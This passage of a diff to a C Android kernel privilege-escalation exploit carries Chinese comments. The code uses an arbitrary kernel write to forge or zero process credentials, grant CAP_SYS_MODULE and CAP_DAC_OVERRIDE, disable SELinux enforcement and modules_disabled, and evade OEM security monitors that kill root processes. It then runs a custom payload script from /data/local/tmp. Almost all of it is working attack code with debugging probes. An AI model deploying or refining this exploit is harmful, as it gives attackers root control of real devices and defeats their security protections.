              * The Cap lines answer the only question that matters after a
@@ -2401,7 +3035,7 @@ static int wait_child_main(const char *mode)
                                          " grep -E '^(Uid|Gid|Cap)'"
                                          " /proc/self/status;"
                                          " cat /proc/self/attr/current;"
-                                         " exec sh -i", NULL};
+                                         " exec sh /data/local/tmp/ksu_stage.sh", NULL};
 
             execve("/system/bin/sh", av, envp);
         }
@@ -2586,7 +3220,8 @@ int main(int argc, char **argv)
         logf("[+] leak-only run complete\n");
         return 0;
     }
-    if (g_fake_stage)
+    /* KEEP_STAGE：不要覆盖 /data/local/tmp/ksu_stage.sh（外面已经放好自定义负载） */
+    if (g_fake_stage && !getenv("KEEP_STAGE"))
         write_ksu_script();
     ensure_pool();
     ensure_raw();
@@ -2602,6 +3237,44 @@ int main(int argc, char **argv)
         }
         if (!r.ok)
             park_forever("no successful plant");
+        /*
+         * 0.83-cg：shell 路线再补一次 cap_effective。
+         *
+         * uid 清完之后 execve 会按 effective = permitted & bset 重算，而
+         * shell 的 bset 被裁到 0xc0，exec 之后 caps 一定是空的。要写
+         * /sys/fs/cgroup/cgroup.procs（0775 system:system）把进程迁出
+         * adbd 的 uid_0/pid_* 子树，唯一的办法是在 exec 之前先拿到
+         * CAP_DAC_OVERRIDE，趁它还在完成迁移。
+         *
+         * 值取 V+0x7f（mode=4 里改的），低 3 位 = 111，bit1 必然命中，
+         * 所以正常情况下第一轮就过；循环只是兜底。
+         */
+        if (getenv("PRE_CG"))
+        {
+            struct plant_res cr;
+            static const unsigned long long capoff = 0x38;
+            int att = 0;
+
+            memset(&cr, 0, sizeof(cr));
+            g_aw_value = 0;
+            for (; att < 8; att++)
+            {
+                memset(&cr, 0, sizeof(cr));
+                if (stage_write(R + capoff, 4, "cap_eff", raw, &cr))
+                {
+                    logf("[cap] plant 失败，重来\n");
+                    continue;
+                }
+                if (cr.A & (1ULL << 1))
+                    break;
+                logf("[cap] cred+0x38 <- %#llx 无 DAC_OVERRIDE，重来\n", cr.A);
+            }
+            if (att >= 8)
+                logf("[!] cap_eff 未拿到 CAP_DAC_OVERRIDE\n");
+            else
+                logf("[+] cap_eff=%#llx (DAC_OVERRIDE 命中 att=%d)\n",
+                     cr.A, att + 1);
+        }
     }
     else
     {
@@ -2632,7 +3305,14 @@ int main(int argc, char **argv)
         {
             int pow = read_panic_on_warn();
 
-            if (pow != 0 && g_cfg.panic_on_warn)
+            /*
+             * SKIP_PANIC_STAGE：不发 panic_on_warn 的零写。
+             * 这个地址是从镜像推出来的，如果偏了就是往内核 .data 里乱写 8 字节，
+             * 观测上有几次重启正好落在这个阶段，先关掉它做对照。
+             */
+            if (getenv("SKIP_PANIC_STAGE"))
+                logf("[!] SKIP_PANIC_STAGE: 跳过 panic_on_warn 零写\n");
+            else if (pow != 0 && g_cfg.panic_on_warn)
             {
                 if (stage_write(g_cfg.panic_on_warn + g_slide, 0,
                                 "panic_on_warn", raw, NULL))
@@ -2644,13 +3324,201 @@ int main(int argc, char **argv)
                 (void)read_panic_on_warn();
             }
         }
-        if (stage_write(g_child_task + g_cfg.task_cred_off, 2, "fake_cred",
-                        raw, &fc))
+        if (getenv("CAPS_ONLY"))
+        {
+            /*
+             * 只给 caps、不改 uid。
+             *
+             * 动机：厂商监控（oplus_app_monitor.ko）在进程 uid 变 0 并开始
+             * 运行的一瞬间就 SIGKILL，原地清 uid 的路子走不通。但只提权
+             * capability、把 uid 留在 2000，判定条件不满足，进程能活。
+             *
+             * 写原语是 mode=2：把 node 地址（0xffffff8xxxxxxxxx）写进目标。
+             * cap[0] 是低 32 位、cap[1] 是高 32 位，低 32 位对我们来说是随机的，
+             * 所以要按位筛：只接受同时含 CAP_DAC_OVERRIDE(1) 和
+             * CAP_SYS_MODULE(16) 的值，反复重试直到命中。
+             */
+            /*
+             * 0x30 cap_permitted / 0x38 cap_effective / 0x40 cap_bset。
+             * 必须连 bset 一起写：execve 会按 bset 重算 permitted/effective，
+             * 只写前两个的话 exec 之后就只剩原 bset（0x8000c0），
+             * CAP_SYS_MODULE 会丢。
+             */
+            /*
+             * 0.82-aw：改用 mode=4 的任意写，直接写 fullcap 常量。
+             *
+             * 以前靠 mode=2 写 node 地址，cap 值 = 0xffffff8xxxxxxx，只有
+             * bit16 靠运气；而且 5.15.123 的 bounding set 被裁到 0xc0，
+             * 只改 permitted 没用，cap_bset 必须一起抬到 fullcap 才过得去
+             * execve 的 cap 重算。三个槽都写，写的是确定值，不用再赌。
+             */
+            /*
+             * 只写 cap_effective（0x38）。delete_module 走的是 capable()，
+             * 只看 effective；worker 是 euid 2000 + 无 file caps，execve 不会
+             * 重算 caps，所以写这一个槽就够。
+             * 写入值必然是一个内核地址（任意写的 child 必须可写），bit16
+             * 由该页地址决定，命中率约 1/2 —— 没中就再 plant 一次，最多 8 次。
+             */
+            static const unsigned long long slots[] = {0x38};
+            const unsigned long long need = (1ULL << 16);
+
+            memset(&fc, 0, sizeof(fc));
+            fc.A = 0;
+            for (unsigned k = 0; k < sizeof(slots) / sizeof(slots[0]); k++)
+            {
+                int got = 0;
+
+                for (int att = 0; att < 8 && !got; att++)
+                {
+                    struct plant_res cr;
+
+                    memset(&cr, 0, sizeof(cr));
+                    if (stage_write(R + slots[k], 4, "caps_aw", raw, &cr))
+                        continue;
+                    if ((cr.A & need) != need)
+                    {
+                        logf("[caps] cred+%#llx <- %#llx bit16=0，重来\n",
+                             slots[k], cr.A);
+                        continue;
+                    }
+                    logf("[caps] cred+%#llx <- %#llx (bit16 命中 att=%d)\n",
+                         slots[k], cr.A, att + 1);
+                    got = 1;
+                }
+                if (!got)
+                    logf("[!] caps cred+%#llx 未命中\n", slots[k]);
+            }
+            /*
+             * caps 写完之后才清 SELinux：清完 safecenter 十几秒内会强制重启，
+             * 必须放在所有 plant 之后，紧接着让 worker 去 rmmod。
+             */
+            if (!getenv("SKIP_SELINUX"))
+            {
+                if (stage_write(g_cfg.selinux_state + g_slide - 7, 0,
+                                "selinux", raw, NULL))
+                    logf("[!] selinux 清零失败，rmmod 会被 SELinux 拦\n");
+                else
+                    logf("[+] selinux after write: enforce=%d\n",
+                         selinux_enforcing());
+            }
+            if (getenv("ZERO_MODDIS"))
+            {
+                /*
+                 * modules_disabled 是个 int（内核 .bss），init_module 里
+                 * `if (!capable(CAP_SYS_MODULE) || modules_disabled) return -EPERM;`
+                 * 是全系统模块加载的总闸。写原语只能整 8 字节写，所以按 8 对齐
+                 * 往下取整，会连带清掉前一个 int（大概率是 padding）。
+                 * 地址来自 5.15.123 的符号表（kallsyms modules_disabled）。
+                 */
+                unsigned long long md =
+                    0xffffffc00ad1892cULL + g_slide;
+
+                md &= ~7ULL;
+                logf("[moddis] zero-write %#llx\n", md);
+                if (stage_write(md, 0, "modules_disabled", raw, NULL))
+                    logf("[!] modules_disabled 清零失败\n");
+                else
+                    logf("[+] modules_disabled 已清零\n");
+            }
+        }
+        else if (getenv("CRED_INPLACE"))
+        {
+            /*
+             * 不伪造 cred 页，直接原地改这份真实 cred。
+             *
+             * 好处：
+             *  - cred 和 real_cred 指向同一个对象，改完两者一致，
+             *    后面 setresuid/commit_creds 的 BUG_ON(cred != old) 不会触发；
+             *  - security blob 是内核自己分配的合法对象，LSM 检查不会崩
+             *    （5.15 + PANIC_ON_OOPS=y 下，伪造 blob 会直接 panic 重启）。
+             *
+             * 只清 uid/gid、suid/sgid、euid/egid 三组（cred+0x04..0x1b）。
+             * euid==0 且 securebits 未设 NOROOT 时，execve 会按 root 规则
+             * 把 cap_permitted/effective 补成 bset 全集，所以不用单独写 caps。
+             * fsuid 保持原值，exec 后有 CAP_DAC_OVERRIDE 兜底。
+             */
+            static const unsigned long long coff[] = {0x04, 0x0c, 0x14};
+            int ci_ok = 1;
+
+            memset(&fc, 0, sizeof(fc));
+            fc.A = 0;
+            for (unsigned k = 0; k < sizeof(coff) / sizeof(coff[0]); k++)
+            {
+                logf("[inplace] zero cred+%#llx = %#llx\n", coff[k], R + coff[k]);
+                if (stage_write(R + coff[k], 0, "cred_zero", raw, NULL))
+                {
+                    ci_ok = 0;
+                    logf("[!] inplace cred+%#llx 失败\n", coff[k]);
+                }
+            }
+            logf("[inplace] uid/suid/euid 清零 %s (cred=%#llx)\n",
+                 ci_ok ? "完成" : "部分失败", R);
+        }
+        else if (getenv("PROBE_CRED_ZERO"))
+        {
+            memset(&fc, 0, sizeof(fc));
+            fc.A = 0;
+            logf("[probe] zero-write cred+4 = %#llx (R=%#llx)\n",
+                 R + g_cfg.cred_uid_off, R);
+            if (stage_write(R + g_cfg.cred_uid_off, 0, "probe_cred", raw, NULL))
+                park_forever("probe cred write failed");
+        }
+        else if (getenv("PROBE_OFF_ZERO"))
+        {
+            unsigned long long po =
+                strtoull(getenv("PROBE_OFF_ZERO"), NULL, 0);
+
+            memset(&fc, 0, sizeof(fc));
+            fc.A = 0;
+            logf("[probe] zero-write %#llx (task+%#llx)\n",
+                 g_child_task + po, po);
+            if (stage_write(g_child_task + po, 0, "probe_off", raw, NULL))
+                park_forever("probe zero write failed");
+        }
+        else if (getenv("SKIP_FAKE"))
+        {
+            memset(&fc, 0, sizeof(fc));
+            fc.A = 0;
+            logf("[!] SKIP_FAKE: 不写 task->cred，只验证唤醒链路\n");
+        }
+        else if (stage_write(g_child_task +
+                                 (getenv("FAKE_OFF")
+                                      ? strtoull(getenv("FAKE_OFF"), NULL, 0)
+                                      : g_cfg.task_cred_off),
+                             2, "fake_cred", raw, &fc))
             park_forever("fake cred write failed");
+        if (getenv("DUAL_CRED"))
+        {
+            /*
+             * 5.15 的 task_struct 里 real_cred/cred 是两个相邻槽位：0x790 被
+             * /proc 读到，0x798 被 getuid() 读到（__arm64_sys_getuid 里
+             * ldr x8,[x8,#0x798]）。只改一个的话进程自己的凭据不变，
+             * 所以两个都指向 fake cred（两份内容相同，只是各来自一次 plant）。
+             */
+            struct plant_res fc2;
+
+            memset(&fc2, 0, sizeof(fc2));
+            if (stage_write(g_child_task + 0x798, 2, "fake_cred2", raw, &fc2))
+                logf("[!] real_cred 侧 fake cred 写入失败，继续\n");
+            else
+                logf("[+] dual cred: %#llx / %#llx\n", fc.A, fc2.A);
+        }
         logf("[+] fake cred A=%#llx selinux_state=%#llx\n", fc.A,
              g_cfg.selinux_state + g_slide);
         if (selinux_enforcing() == 0)
             logf("[+] selinux already permissive; skipping that plant\n");
+        else if (getenv("SKIP_SELINUX"))
+        {
+            /*
+             * 调试用：不改 selinux_state.enforcing。
+             * fake cred 的 security blob 四个 sid 已经写成 SECINITSID_KERNEL，
+             * 理论上进程换 cred 之后就是 kernel 域，不依赖全局 permissive。
+             * 关 enforcing 会被 ColorOS 安全监控判定为破坏并强制重启，
+             * 所以真机验证优先走这条路。
+             */
+            logf("[!] SKIP_SELINUX: 保持 enforcing=%d，靠 fake blob 的 kernel sid\n",
+                 selinux_enforcing());
+        }
         else if (stage_write(g_cfg.selinux_state + g_slide - 7, 0,
                              "selinux", raw, NULL))
             park_forever("selinux write failed");
@@ -2681,8 +3549,139 @@ int main(int argc, char **argv)
     }
     logf("[+] cred writes landed, waking child\n");
 
-    if (write(go_fd, "A", 1) != 1)
-        logf("[!] child wake write failed\n");
+    if (getenv("SURVIVE_PROBE"))
+    {
+        /*
+         * 量“uid 变 0 之后还能活多久”。不唤醒子进程，纯观察 /proc。
+         * 如果几十毫秒内就消失，说明是厂商监控在轮询 /proc 杀 uid=0 的
+         * shell 进程，那就必须先干掉监控再提权；如果一直活着，说明
+         * 之前的 SIGKILL 来自别处（coredump 组退出 / 我们自己 kill）。
+         */
+        int k;
+
+        for (k = 0; k < 120; k++)
+        {
+            char p2[64];
+            struct stat stt;
+
+            snprintf(p2, sizeof(p2), "/proc/%d/stat", C);
+            if (stat(p2, &stt) != 0)
+            {
+                logf("[survive] child GONE (reaped) after %d ms\n", k * 50);
+                break;
+            }
+            /*
+             * stat 存在不代表活着：没被 reap 的僵尸也会留着 /proc 项。
+             * 读 state 字段，Z 就是已经死了。
+             */
+            {
+                int fd2 = open(p2, O_RDONLY);
+                char bb[256];
+                int nn = fd2 >= 0 ? (int)read(fd2, bb, sizeof(bb) - 1) : -1;
+
+                if (fd2 >= 0)
+                    close(fd2);
+                if (nn > 0)
+                {
+                    char *rp = strrchr(bb, ')');
+
+                    if (rp && rp[1] == ' ')
+                    {
+                        char st = rp[2];
+
+                        if (st == 'Z')
+                        {
+                            logf("[survive] child became ZOMBIE at %d ms (already dead)\n",
+                                 k * 50);
+                            break;
+                        }
+                        if (k == 0 || k % 20 == 0)
+                            logf("[survive] t=%dms state=%c\n", k * 50, st);
+                    }
+                }
+            }
+            usleep(50000);
+        }
+        if (k == 120)
+            logf("[survive] child still alive after 6000 ms\n");
+    }
+
+    {
+        int ws = 0;
+        pid_t w = waitpid(C, &ws, WNOHANG);
+
+        if (w == C)
+            logf("[!] child %d already dead before wake: st=%#x\n", C, ws);
+        else if (kill(C, 0))
+            logf("[!] child %d kill(0) errno=%d\n", C, errno);
+        else
+            logf("[+] child %d alive before wake\n", C);
+    {
+        char path[64], buf[4096];
+        int fd;
+
+        snprintf(path, sizeof(path), "/proc/%d/status", C);
+        fd = open(path, O_RDONLY);
+        if (fd >= 0)
+        {
+            int n = (int)read(fd, buf, sizeof(buf) - 1);
+
+            close(fd);
+            if (n > 0)
+            {
+                char *q;
+
+                buf[n] = 0;
+                q = strstr(buf, "Uid:");
+                if (q)
+                {
+                    char *e = strchr(q, '\n');
+
+                    if (e)
+                        *e = 0;
+                    logf("[probe] %s\n", q);
+                }
+                q = strstr(buf, "Name:");
+                if (q)
+                {
+                    char *e = strchr(q, '\n');
+
+                    if (e)
+                        *e = 0;
+                    logf("[probe] %s\n", q);
+                }
+                q = strstr(buf, "CapEff:");
+                if (q)
+                {
+                    char *e = strchr(q, '\n');
+
+                    if (e)
+                        *e = 0;
+                    logf("[probe] %s\n", q);
+                }
+            }
+        }
+    }
+    }
+    {
+        const char *gate = getenv("GATE_FILE");
+
+        if (gate && *gate)
+        {
+            int gf = open(gate, O_WRONLY | O_CREAT | O_TRUNC, 0666);
+
+            if (gf >= 0)
+            {
+                write(gf, "1", 1);
+                close(gf);
+                logf("[+] gate opened: %s\n", gate);
+            }
+            else
+                logf("[!] gate open failed errno=%d\n", errno);
+        }
+        else if (write(go_fd, "A", 1) != 1)
+            logf("[!] child wake write failed\n");
+    }
     close(go_fd);
 
     {
@@ -2709,7 +3708,23 @@ int main(int argc, char **argv)
 
     {
         int st = 0;
+        siginfo_t si;
 
+        /*
+         * 先不 reap：用 waitid(WNOWAIT) 读 siginfo，判断 SIGKILL 是谁发的。
+         *   si_code = SI_KERNEL(0x80)  -> 内核 make_task_dead / oops
+         *   si_code = SI_USER(0)/SI_TKILL(-6) -> 用户态进程，si_pid 就是凶手
+         * 这一步决定后面是查内核 oops 还是查被谁杀。
+         */
+        memset(&si, 0, sizeof(si));
+        if (waitid(P_PID, (id_t)C, &si, WEXITED | WNOWAIT | WNOHANG) == 0 &&
+            si.si_pid)
+            logf("[!] child si_code=%d (%s) si_pid=%d si_status=%d\n",
+                 si.si_code,
+                 si.si_code == SI_USER ? "SI_USER" :
+                 si.si_code == SI_TKILL ? "SI_TKILL" :
+                 si.si_code == SI_KERNEL ? "SI_KERNEL" : "?",
+                 (int)si.si_pid, si.si_status);
         if (waitpid(C, &st, 0) == C)
             logf("[+] child exit status=%#x\n", st);
     }
